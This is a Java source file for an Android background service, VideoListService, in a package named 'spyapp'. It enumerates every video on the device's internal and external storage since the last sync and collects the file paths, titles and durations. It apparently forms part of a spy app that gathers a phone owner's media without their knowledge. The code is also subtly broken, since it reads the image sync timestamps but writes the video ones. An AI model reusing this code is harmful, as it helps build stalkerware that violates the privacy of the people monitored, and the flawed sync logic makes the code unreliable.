package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.ImageModel;
import com.app.spyapp.model.VideoModel;

import java.util.ArrayList;
import java.util.Calendar;


public class VideoListService extends IntentService {
    private SpyApp spyApp;
    private long lastExternalSyncDate;
    private long lastInternalSyncDate;
    private ArrayList<VideoModel> videoList = new ArrayList<>();
    public VideoListService() {
        super(VideoListService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        spyApp = (SpyApp) getApplicationContext();
        lastExternalSyncDate = spyApp.getSharedPreferences().getLong(Pref.LAST_EXTERNAL_IMAGE_SYNC, 0);
        lastInternalSyncDate = spyApp.getSharedPreferences().getLong(Pref.LAST_INTERNAL_IMAGE_SYNC, 0);
        ArrayList<VideoModel> internalVideoList = getAllvideo(this, true);
        if (internalVideoList != null && internalVideoList.size() > 0) {
            videoList.addAll(internalVideoList);
        }
        ArrayList<VideoModel> externalvideoList = getAllvideo(this, false);
        if (externalvideoList != null && externalvideoList.size() > 0) {
            videoList.addAll(externalvideoList);
        }
    }

    public ArrayList<VideoModel> getAllvideo(Context context, boolean fromInternalStorage) {
        ArrayList<VideoModel> list = new ArrayList<>();
        Uri uri = null;
        if (fromInternalStorage) {
            uri = MediaStore.Video.Media.INTERNAL_CONTENT_URI;
        } else {
            uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        }
        String[] projection = {MediaStore.Video.VideoColumns.DATA
                , MediaStore.Video.VideoColumns.MIME_TYPE
                , MediaStore.Video.VideoColumns.TITLE
                , MediaStore.Video.VideoColumns.CATEGORY
                , MediaStore.Video.VideoColumns.DURATION
                , MediaStore.Video.VideoColumns.DATE_TAKEN
                , MediaStore.Video.VideoColumns.DISPLAY_NAME
                , MediaStore.Video.VideoColumns._ID};
        Cursor c = context.getContentResolver().query(uri, projection, null, null, null);
        int vidsCount = 0;
        if (c != null) {
            vidsCount = c.getCount();
            while (c.moveToNext()) {

                long tempdate = 0;

                if (fromInternalStorage) {
                    tempdate = lastInternalSyncDate;
                } else {
                    tempdate = lastExternalSyncDate;
                }
                long date = c.getLong(5);
                if (date > tempdate) {


                    String data = c.getString(0);
                    String mimeType = c.getString(1);
                    String title = c.getString(2);
                    String category = c.getString(3);
                    long duration = c.getLong(4);

                    int videoid = c.getInt(7);
                    VideoModel videoModel = new VideoModel();
                    videoModel.setVideopath(data);
                    videoModel.setId(videoid);
                    videoModel.setMimeType(mimeType);
                    videoModel.setTitle(title);
                    if (category != null)
                        videoModel.setCategory(category);
                    videoModel.setDuration(duration);
                    videoModel.setAddeddate(date);
                    list.add(videoModel);
                }
            }
            c.close();
        }
        SharedPreferences.Editor editor = spyApp.getSharedPreferences().edit();
        if (fromInternalStorage) {
            editor.putLong(Pref.LAST_INTERNAL_VIDEO_SYNC, Calendar.getInstance().getTimeInMillis());
        } else {
            editor.putLong(Pref.LAST_EXTERNAL_VIDEO_SYNC, Calendar.getInstance().getTimeInMillis());
        }

        editor.commit();
        return list;
    }
}
